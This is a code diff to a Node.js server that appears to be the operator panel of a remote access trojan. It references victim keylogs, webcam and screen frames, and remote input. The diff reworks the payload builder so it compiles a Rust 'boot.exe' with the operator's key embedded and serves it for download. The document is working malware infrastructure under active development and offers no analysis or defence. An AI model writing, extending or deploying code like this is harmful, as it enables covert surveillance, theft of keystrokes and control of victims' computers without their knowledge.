@@ -15,7 +15,7 @@ import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
 import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
-import { compileLauncher } from './builder/compile.js';
+import { buildBoot } from './builder/rustbuild.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -557,9 +557,6 @@ app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
 const DOWNLOAD_DIR = path.join(__dirname, 'download');
 if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
 
-const EXE_DIR = path.join(__dirname, 'exe');
-if (!fs.existsSync(EXE_DIR)) fs.mkdirSync(EXE_DIR, { recursive: true });
-
 const BUILD_DIR = path.join(__dirname, 'build');
 if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
 
@@ -603,30 +600,15 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
 
 // ---------- builder ----------
 
+// no external bases — the rust source is the base
 app.get('/api/build/bases', requireAuth, (req, res) => {
-  let files = [];
-  try { files = fs.readdirSync(EXE_DIR); } catch { return res.json([]); }
-  const bases = files
-    .filter(f => /\.(exe|msi|bin|dll)$/i.test(f))
-    .map(f => {
-      const st = fs.statSync(path.join(EXE_DIR, f));
-      return { name: f, size: st.size };
-    });
-  res.json(bases);
+  res.json([]);
 });
 
+// compile boot.exe with the account key baked into embedded_key.rs,
+// drop it in /download/ so /api/downloads/boot.exe serves it
 app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
-  const { base, key, config } = req.body || {};
-
-  if (!base || typeof base !== 'string') return res.status(400).json({ error: 'base required' });
-  if (base.includes('..') || base.includes('/') || base.includes('\\')) return res.status(400).json({ error: 'bad base' });
-  if (!/^[A-Za-z0-9_\-\.]+$/.test(base)) return res.status(400).json({ error: 'bad base' });
-  if (!/\.(exe|msi|bin|dll)$/i.test(base)) return res.status(400).json({ error: 'base must be exe/msi/bin/dll' });
-
-  const baseSrc = path.resolve(EXE_DIR, base);
-  const baseRoot = path.resolve(EXE_DIR);
-  if (!baseSrc.startsWith(baseRoot + path.sep)) return res.status(400).json({ error: 'bad path' });
-  if (!fs.existsSync(baseSrc)) return res.status(404).json({ error: 'base not found' });
+  const { key } = req.body || {};
 
   const row = getOwnUser(req.user.uid);
   const acctKey = row?.account_key || '';
@@ -636,36 +618,36 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
 
   if (!buildKey) return res.status(400).json({ error: 'no key — type one or set an account key' });
 
-  const cfg = (typeof config === 'object' && config !== null) ? config : {};
-
-  let exeBuf;
+  let bootBuf;
   try {
-    exeBuf = await compileLauncher({
-      key: buildKey,
-      config: cfg,
-      baseExe: baseSrc,
-    });
+    bootBuf = await buildBoot({ key: buildKey });
   } catch (e) {
-    console.error('[build] compile failed:', e);
-    return res.status(500).json({ error: 'compile failed: ' + (e.message || 'unknown') });
+    console.error('[build] cargo failed:', e);
+    const msg = (e.stderr || e.message || 'unknown').toString().slice(0, 2000);
+    return res.status(500).json({ error: 'compile failed: ' + msg });
   }
 
-  const outName = `${path.parse(base).name}_${Date.now()}.exe`;
+  // live file — what /api/downloads/boot.exe serves
+  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), bootBuf, { mode: 0o755 });
+
+  // archive for the builds table
+  const outName = `boot_${Date.now()}.exe`;
   const outPath = path.join(BUILD_DIR, outName);
-  fs.writeFileSync(outPath, exeBuf, { mode: 0o755 });
+  fs.writeFileSync(outPath, bootBuf, { mode: 0o755 });
 
   const info = db.prepare(sql`
     INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-  `).run(req.user.uid, outName, outName, exeBuf.length, base, buildKey, JSON.stringify(cfg), Date.now());
+  `).run(req.user.uid, outName, outName, bootBuf.length, 'boot', buildKey, '{}', Date.now());
 
   res.json({
     ok: true,
     buildId: Number(info.lastInsertRowid),
     name: outName,
-    size: exeBuf.length,
+    size: bootBuf.length,
     key: buildKey,
     url: `/api/builds/${info.lastInsertRowid}/download`,
+    liveUrl: '/api/downloads/boot.exe',
   });
 });
 
